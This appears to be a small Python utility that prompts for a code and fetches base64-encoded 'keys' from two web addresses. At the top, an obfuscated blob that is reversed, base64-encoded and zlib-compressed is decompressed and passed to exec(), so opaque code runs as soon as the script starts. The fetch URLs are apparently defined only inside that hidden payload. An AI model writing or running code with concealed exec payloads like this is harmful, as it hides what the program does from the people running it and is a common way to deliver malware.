import requests, base64
from bs4 import BeautifulSoup
thingy = input("enter code")

_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(
    b'==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'))


def get_iedla_keys1():
    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text(strip=True)
        bite_text = text.encode('utf-8')
        bite_text = base64.b64decode(bite_text)
        plain_text = bite_text.decode('utf-8')
        return plain_text
    except requests.exceptions.RequestException as e:
        print(f"Could not get the page: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
def get_iedla_keys2():
    try:
        response2 = requests.get(url2)
        response2.raise_for_status()

        soup2 = BeautifulSoup(response2.text, 'html.parser')
        text2 = soup2.get_text(strip=True)
        bite_text2 = text2.encode('utf-8')
        bite_text2 = base64.b64decode(bite_text2)
        plain_text2 = bite_text2.decode('utf-8')
        return plain_text2


    except requests.exceptions.RequestException as e:
        print(f"Could not get the page: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
print(get_iedla_keys1()+get_iedla_keys2())